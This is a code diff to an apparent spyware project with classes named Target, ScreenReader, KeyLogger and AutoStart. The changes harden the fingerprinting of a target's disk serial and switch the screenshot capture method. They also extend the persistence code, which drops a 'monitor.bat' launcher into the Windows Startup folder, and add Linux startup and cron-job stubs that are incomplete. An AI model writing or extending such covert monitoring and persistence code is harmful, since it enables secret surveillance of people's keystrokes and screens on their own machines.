@@ -215,10 +215,13 @@ class Target(BaseTarget):
 
         # TODO: Handle the situation where sda is present in place of nvme0n1
         if 'linux' in self.platform:
-            hdd_serial = list(filter(lambda x: b"ID_SERIAL=" in x, subprocess.run(
-                ["udevadm", "info", "--query=all", "--name=/dev/nvme0n1"],
-                capture_output=True
-            ).stdout.split(b"\n")))[0].split(b"=")[1]
+            try:
+                hdd_serial = list(filter(lambda x: b"ID_SERIAL=" in x, subprocess.run(
+                    ["udevadm", "info", "--query=all", "--name=/dev/nvme0n1"],
+                    capture_output=True
+                ).stdout.split(b"\n")))[0].split(b"=")[1]
+            except:
+                hdd_serial = b""
         else:
             hdd_serial = b""
         
@@ -385,8 +388,8 @@ class ScreenReader(BaseTarget):
             tool based on platform.
         """
         if 'linux' in self.platform:
-            # img = self.take_screenshot_mss()
-            img = self.take_screenshot_pygobject()
+            img = self.take_screenshot_mss()
+            # img = self.take_screenshot_pygobject()
             # img = self.take_screenshot_PIL()
             img.save("img.jpg")
         elif "windows" in self.platform:
@@ -711,6 +714,10 @@ class KeyLogger(BaseTarget):
 
 class AutoStart(object):
 
+    """
+    Setup autostart for the target executable
+    """
+
     def __init__(self) -> None:
         self.running = False
 
@@ -718,7 +725,7 @@ class AutoStart(object):
         self.running = True
         if "windows" in platform.platform().lower():
             while self.running:
-                if not os.path.exists("path.txt"):
+                if not os.path.exists("filename.txt"):
                     cur_dir = os.path.abspath(".")
                     files = os.listdir(cur_dir)
                     path = list(filter(lambda x: x.lower().endswith(".exe"), files))
@@ -732,8 +739,24 @@ class AutoStart(object):
                     path = f.read()
 
                 self.startup_folder_windows(path)
+                sleep(1)
 
-    def startup_folder_windows(self, path):
+        elif "linux" in platform.platform().lower():
+            while self.running:
+                if not os.path.exists("filename.txt"):
+                    logging.debug("filename.txt not found")
+                    break
+
+                with open("filename.txt") as f:
+                    path = f.read()
+                
+                s = self.startup_folder_linux(path)
+                c = self.cronjob_linux(path)
+                self.running = s or c
+
+                sleep(1)
+
+    def startup_folder_windows(self, path: str):
         user = os.path.expanduser("~")
         folder = os.path.join(user, "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
         bat_file = os.path.join(folder, "monitor.bat")
@@ -742,7 +765,14 @@ class AutoStart(object):
         with open(bat_file, "w") as f:
             f.write(f"cd /d {os.path.dirname(path)}\n")
             f.write(f"start {path}")
-        sleep(1)
+        return True
+
+    def startup_folder_linux(self, path: str):
+        pass
+
+    def cronjob_linux(self, path: str):
+
+        return True
 
     def stop(self):
         self.running = False
